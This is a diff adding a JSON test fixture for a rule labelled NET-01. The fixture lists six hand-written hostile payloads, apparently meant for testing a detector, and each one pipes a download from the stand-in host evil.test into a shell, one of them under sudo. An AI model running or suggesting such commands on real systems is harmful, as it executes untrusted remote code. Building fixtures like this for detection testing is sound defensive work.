@@ -1,0 +1,12 @@
+{
+  "rule": "NET-01",
+  "note": "Hand-written hostile fixtures (Suite A): pipe remote downloads into shells.",
+  "cases": [
+    {"id": "h-net01-1", "payload": "curl https://evil.test/install | sh"},
+    {"id": "h-net01-2", "payload": "wget http://evil.test/i | bash"},
+    {"id": "h-net01-3", "payload": "curl -fsSL https://evil.test/i | sudo bash"},
+    {"id": "h-net01-4", "payload": "wget -qO- https://evil.test/i | sh"},
+    {"id": "h-net01-5", "payload": "curl -s https://evil.test/i | bash -s -- --run"},
+    {"id": "h-net01-6", "payload": "curl -A agent https://evil.test/i | sh"}
+  ]
+}
